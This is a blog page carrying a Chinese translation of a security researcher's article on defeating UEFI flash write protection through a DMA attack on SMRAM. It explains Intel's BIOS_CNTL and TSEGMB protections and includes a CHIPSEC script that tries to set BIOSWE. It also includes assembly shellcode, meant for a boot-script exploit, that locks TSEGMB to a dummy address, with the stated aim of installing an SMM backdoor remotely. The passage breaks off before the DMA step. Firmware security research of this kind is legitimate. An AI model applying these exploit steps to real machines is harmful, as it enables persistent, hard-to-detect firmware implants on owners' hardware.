<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/project/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/project/fontawesome/css/brands.css" rel="stylesheet">
<link href="/project/fontawesome/css/solid.css" rel="stylesheet">
<script src="/project/js/color.global.min.js" ></script>
<script src="/project/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>利用DMA攻击突破UEFI安全机制 | Edvison&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="原文： http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2015&#x2F;09&#x2F;breaking-uefi-security-with-software.html">
<meta property="og:type" content="article">
<meta property="og:title" content="利用DMA攻击突破UEFI安全机制">
<meta property="og:url" content="https://edvison.github.io/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/index.html">
<meta property="og:site_name" content="Edvison&#39;s blog">
<meta property="og:description" content="原文： http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2015&#x2F;09&#x2F;breaking-uefi-security-with-software.html">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162641420.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162655657.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162716258.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162742381.png">
<meta property="article:published_time" content="2023-08-09T08:26:09.000Z">
<meta property="article:modified_time" content="2023-08-09T08:27:49.025Z">
<meta property="article:author" content="edvison">
<meta property="article:tag" content="UEFI">
<meta property="article:tag" content="DMA攻击">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162641420.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Edvison's blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230807175151.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/project/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Edvison's blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/project/">Home</a>
    
      <a class="main-nav-link" href="/project/archives">Archives</a>
    
      <a class="main-nav-link" href="/project/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/project/atom.xml" title="RSS 订阅">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/project/">Home</a>
    
      <a class="nav-dropdown-link" href="/project/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/project/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/project/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230808155156.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Edvison </div>
      <div class="dot"></div>
      <div class="subtitle">flung out of space </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Edvison" title="github"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://weibo.com/u/6038772011" title="weibo"><i class="fa-brands fa-weibo"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/project/categories/UEFI%E5%8E%9F%E7%90%86/">
                UEFI原理
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">
                UEFI固件安全
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/project/categories/MBR%E5%8E%9F%E7%90%86/">
                MBR原理
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">
                翻译
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/Grub2%E5%8E%9F%E7%90%86/">
                Grub2原理
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">
                IoT安全
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
                硬件安全
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/VBIOS%E4%BF%AE%E6%94%B9/">
                VBIOS修改
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/CSM/" rel="tag">CSM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/Grub2/" rel="tag">Grub2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR/" rel="tag">MBR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR%E5%90%8E%E9%97%A8/" rel="tag">MBR后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OS-Loader/" rel="tag">OS Loader</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OVMF%E7%BC%96%E8%AF%91/" rel="tag">OVMF编译</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/PCH/" rel="tag">PCH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM/" rel="tag">SMM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">SMM漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/VBIOS/" rel="tag">VBIOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/pcie/" rel="tag">pcie</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4/" rel="tag">写保护</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4%E7%AA%81%E7%A0%B4/" rel="tag">写保护突破</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%8E%9F%E7%90%86/" rel="tag">原理</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%BC%80%E5%8F%91%E6%9D%BF/" rel="tag">开发板</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%94%B5%E6%BA%90%E6%95%85%E9%9A%9C/" rel="tag">电源故障</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/project/archives/2023/08 ">
          八月 2023 
          <div class="archive-count">22 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Lenovo固件中的SMM callout漏洞利用" >
            <div class="recent-link-text">
              Lenovo固件中的SMM callout漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="利用DMA攻击突破UEFI安全机制" >
            <div class="recent-link-text">
              利用DMA攻击突破UEFI安全机制
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="UEFI 引导脚本表漏洞利用" >
            <div class="recent-link-text">
              UEFI 引导脚本表漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/" title="基于UEFI平台的SMM后门构建" >
            <div class="recent-link-text">
              基于UEFI平台的SMM后门构建
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="P4wnP1配置与使用" >
            <div class="recent-link-text">
              P4wnP1配置与使用
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-利用DMA攻击突破UEFI安全机制" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        利用DMA攻击突破UEFI安全机制
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-08-09T08:26:09.000Z" itemprop="datePublished">2023-08-09</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">翻译</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            9.3k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>原文： <a target="_blank" rel="noopener" href="http://blog.cr4.sh/2015/09/breaking-uefi-security-with-software.html">http://blog.cr4.sh/2015/09/breaking-uefi-security-with-software.html</a></p>
<span id="more"></span>


<p>大家好!在本文中，我将告诉你更多关于UEFI漏洞利用的信息。上次在“<a target="_blank" rel="noopener" href="http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html">UEFI引导脚本表漏洞利用</a>”的文章中，我展示了如何在PEI的早期阶段执行任意shellcode，从而绕过保护<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/System_Management_Mode">系统管理模式(SMM)</a>内存(SMRAM)免受DMA攻击的安全机制。现在，我们将对SMRAM执行DMA攻击，禁用<code>BIOS_CNTL</code> flash写保护——使我们能够将受感染的固件写入主板上的ROM芯片。这种攻击可以用于安装我的SMM后门，而不需要物理访问目标机器(在之前的文章中，我解释了它是如何工作的，以及如何使用编程器安装它)。我的DMA软件攻击方法基于Linux操作系统，可劫持磁盘驱动器使用的DMA缓冲区的物理地址，这种攻击的概念最初是Rafal Wojtczuk在BH US 2008“<a target="_blank" rel="noopener" href="https://www.blackhat.com/presentations/bh-usa-08/Wojtczuk/BH_US_08_Wojtczuk_Subverting_the_Xen_Hypervisor.pdf">Subverting the Xen hypervisor</a>”的演讲中提出的。</p>
<h2 id="BIOS写保护机制"><a href="#BIOS写保护机制" class="headerlink" title="BIOS写保护机制"></a>BIOS写保护机制</h2><p>英特尔硬件提供两种主要机制来保护位于主板上的SPI ROM芯片不被操作系统上的软件写入：</p>
<ul>
<li>通过PCI配置空间访问的平台控制器集线器(PCH)中<code>BIOS_CNTL</code>寄存器的BIOS Write Enable (<code>BIOSWE</code>) 和 BIOS Lock Enable (<code>BLE</code>)位。</li>
<li>SPI保护区域寄存器<code>PR0-PR5</code>。同时，PCH中 <code>HSFS</code>   寄存器的<code>FLOCKDN</code>位用于保护PR寄存器不被覆盖。</li>
</ul>
<p>我在以前的UEFI实验中使用的测试硬件，<a target="_blank" rel="noopener" href="https://www.intel.com/content/www/us/en/support/products/59046/boards-and-kits/desktop-boards/intel-desktop-boards-with-intel-q77-express-chipset/intel-desktop-board-dq77kb.html">Intel DQ77KB主板</a>，没有设置SPI保护区域，这对攻击者来说是很好的目标，因为这种安全机制（不像<code>BIOS_CNTL</code>保护）不依赖于系统管理模式，也不可能被我们所说的SMRAM上的DMA软件攻击所击败。因此，本文中的技术主要适用于使用<code>BIOS_CNTL</code>实现flash写保护的主板和笔记本电脑。<br>以下是<a target="_blank" rel="noopener" href="https://www.intel.com/content/dam/www/public/us/en/documents/datasheets/7-series-chipset-pch-datasheet.pdf">Intel® 7 Series &#x2F; C216 Chipset Family Platform Controller Hub datasheet</a>中关于<code>BIOSWE</code>和<code>BLE</code>位的描述：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162641420.png" alt="image-20230809162641420"></p>
<p><code>BIOSWE</code>位用于控制对闪存芯片的写访问， 清零 后只允许读取访问。<code>BLE</code>位更有趣，它用于保护<code>BIOSWE</code>位不被SMM代码进行未经授权的修改。让我们来看看它是怎么工作的：</p>
<ol>
<li>在早期引导阶段，系统固件将<code>BIOSWE</code>位清零并设置<code>BLE</code>位，一旦<code>BLE</code>位被设为1——直到下一次平台重置，它都不能被修改。</li>
<li>当<code>BLE</code> &#x3D; 1时，每次尝试设置BIOSWE位都会引发系统管理中断(SMI) —— 最高优先级的中断，将挂起操作系统的执行并将CPU切换到系统管理模式。</li>
<li>在SMI调度期间，SMM代码将<code>BIOSWE</code>位清零，并恢复OS执行，因此，在OS下运行的攻击者代码可以重新设置<code>BIOSWE</code>。</li>
</ol>
<p>在正确配置且被锁定的平台上，操作系统不能访问在PEI&#x2F;DXE引导阶段由固件安装的SMM代码，因此，它可以作为安全代理，防止BIOS写保护配置遭受未经授权的修改。让我们来做一个小实验： 我们可以使用<a target="_blank" rel="noopener" href="https://github.com/chipsec/chipsec">CHIPSEC platform security assessment framework</a>编写一个Python脚本来访问<code>BIOS_CNTL</code>寄存器并尝试设置<code>BIOSWE</code>位:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BIOSWE_set</span>():</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    BIOSWE = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># import required CHIPSEC stuff</span></span><br><span class="line">    <span class="keyword">import</span> chipsec.chipset</span><br><span class="line">    <span class="keyword">from</span> chipsec.helper.oshelper <span class="keyword">import</span> helper</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># initialize CHIPSEC helper</span></span><br><span class="line">    cs = chipsec.chipset.cs()</span><br><span class="line">    cs.init(<span class="literal">None</span>, <span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># check if BIOS_CNTL register is available</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> chipsec.chipset.is_register_defined(cs, <span class="string">&#x27;BC&#x27;</span>):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Unsupported hardware&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># get BIOS_CNTL value</span></span><br><span class="line">    val = chipsec.chipset.read_register(cs, <span class="string">&#x27;BC&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] BIOS_CNTL is 0x%x&#x27;</span> % val</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> val &amp; BIOSWE == <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] Trying to set BIOSWE...&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># try to set BIOS write enable bit</span></span><br><span class="line">        chipsec.chipset.write_register(cs, <span class="string">&#x27;BC&#x27;</span>, val | BIOSWE)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># check if BIOSWE bit was actually set</span></span><br><span class="line">        val = chipsec.chipset.read_register(cs, <span class="string">&#x27;BC&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> val &amp; BIOSWE == <span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="comment"># fails, BIOSWE modification was prevented by SMM</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[!] Can\&#x27;t set BIOSWE bit, BIOS write protection is enabled&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;[+] BIOSWE bit was set, BIOS write protection is disabled now&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] BIOSWE bit is already set&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    BIOSWE_set()</span><br></pre></td></tr></table></figure>


<p>以root权限运行此脚本后，我们能看到在Intel DQ77KB主板上，由于启用了<code>BLE</code>保护，无法设置<code>BIOSWE</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localhost ~ # python BIOSWE_set.py</span><br><span class="line">[+] BIOS_CNTL is 0x2a</span><br><span class="line">[+] Trying to set BIOSWE...</span><br><span class="line">[!] Can&#x27;t set BIOSWE bit, BIOS write protection is enabled</span><br></pre></td></tr></table></figure>


<p>要了解更多关于BIOS写保护和安全机制的信息，你还可以阅读以下材料:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ruxcon.org.au/assets/2014/slides/rux-BiosAttackSummary-ruxcon2014.pdf">BIOS and Secure Boot Attacks Uncovered</a> by Intel Security.</li>
<li><a target="_blank" rel="noopener" href="http://conference.hitb.org/hitbsecconf2013kul/materials/D1T1%20-%20Kallenberg,%20Kovah,%20Butterworth%20-%20Defeating%20Signed%20BIOS%20Enforcement.pdf">Defeating Signed BIOS Enforcement</a> by Corey Kallenberg, John Butterworth, Sam Cornwell and Xeno Kovah.</li>
<li><a target="_blank" rel="noopener" href="https://bromiumlabs.files.wordpress.com/2015/01/attacksonuefi_slides.pdf">Attacks on UEFI Security</a> by Rafal Wojtczuk and Corey Kallenberg.</li>
</ul>
<h2 id="直接内存访问-DMA"><a href="#直接内存访问-DMA" class="headerlink" title="直接内存访问(DMA)"></a>直接内存访问(DMA)</h2><p>你可能已经知道，不仅CPU可以访问物理内存，连接到PCI总线的不同硬件设备，如磁盘控制器或网卡，可以利用直接内存访问（DMA）来读写一些数据到物理内存，而不依赖于处理器。让我们来看看在ATA&#x2F;ATAPI支持的磁盘控制器下DMA是如何工作的：</p>
<ol>
<li>软件为I&#x2F;O操作数据分配物理内存块，并为该内存创建物理区域描述符表(PRDT)的表项。PRDT —— 是 DMA控制器中用于 映射到物理内存空间的一种特殊的数据结构。</li>
<li>软件会初始化磁盘控制器的总线主控寄存器，可通过PCI配置空间使用PRDT地址访问磁盘控制器的总线主控寄存器，并在该控制器上启用总线主控器操作模式。</li>
<li>要开始I&#x2F;O操作，软件会把DMA读（0xC8&#x2F;0x25）或DMA写（0xCA&#x2F;0x35）的ATA&#x2F;ATAPI命令发送到目标磁盘设备。发送命令后——操作系统可以将执行上下文切换到其他任务，直到I&#x2F;O操作未完成。</li>
<li>DMA控制器响应来自磁盘设备的DMA请求，并将数据写入物理内存。</li>
<li>数据传输完成后，磁盘设备将发出一个中断信号，该信号允许操作系统恢复挂起的任务执行。</li>
</ol>
<p>很容易看出这种设计并<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/DMA_attack">不安全</a>——具有恶意DMA功能的硬件可以忽略通过PRDT设置的缓冲区地址，并且可以在不需要任何软件许可的情况下将任意数据读&#x2F;写到物理内存的任意位置。为缓解此问题，英特尔推出了VT-d —— 英特尔用于定向I&#x2F;O的<a target="_blank" rel="noopener" href="https://software.intel.com/sites/default/files/managed/c5/15/vt-directed-io-spec.pdf">虚拟化技术</a>（也称为<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit">IOMMU</a>），该技术限制了从硬件直接访问物理内存。Windows，Linux和OS X的现代版本中都提供了IOMMU支持，但是在某些固件攻击的情况下，当攻击者已经完全控制了操作系统后，还需要为SMRAM采用单独的（独立于操作系统或hypervisor）DMA保护机制。<br>该机制的名称是<code>TSEGMB</code>寄存器，在先前的文章中已经提到过，必须在平台初始化期间通过固件对其进行正确配置且锁定：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162655657.png" alt="image-20230809162655657"></p>
<p>但是，如果目标固件容易受到UEFI启动脚本表攻击，我们可以使用<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/UEFI_boot_script_expl/blob/master/boot_script_table.py">先前开发的漏洞利用脚本</a>来绕过TSEGMB保护。为此，我们需要修改漏洞利用脚本的Shellcode并添加一些汇编指令，将TSEGMB寄存器锁定为与实际SMRAM位置不匹配的虚拟&#x2F;无效地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">; bus = 0, dev = 0, func = 0, offset = 0xb8</span><br><span class="line">mov     eax, 0x800000b8</span><br><span class="line">mov     dx, 0xcf8</span><br><span class="line">out     dx, eax</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">; read TSEGMB value</span><br><span class="line">mov     dx, 0xcfc</span><br><span class="line">in      eax, dx</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">; check if TSEGMB is not locked</span><br><span class="line">and     eax, 1</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     _end</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">; bus = 0, dev = 0, func = 0, offset = 0xb8</span><br><span class="line">mov     eax, 0x800000b8</span><br><span class="line">mov     dx, 0xcf8</span><br><span class="line">out     dx, eax</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">; write and lock TSEGMB with dummy value</span><br><span class="line">mov     eax, 0xff000001</span><br><span class="line">mov     dx, 0xcfc</span><br><span class="line">out     dx, eax</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">_end:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">; ...</span><br></pre></td></tr></table></figure>


<p>现在可以运行该漏洞利用脚本了，在此之前，先让我们来用CHIPSEC框架的<a target="_blank" rel="noopener" href="https://github.com/chipsec/chipsec/blob/9c6a2b9996938cfed97206ce7331ad094aa3853e/chipsec/modules/common/smm_dma.py">smm_dma</a>模块来检查一下当前的<code>TSEGMB</code>值：</p>
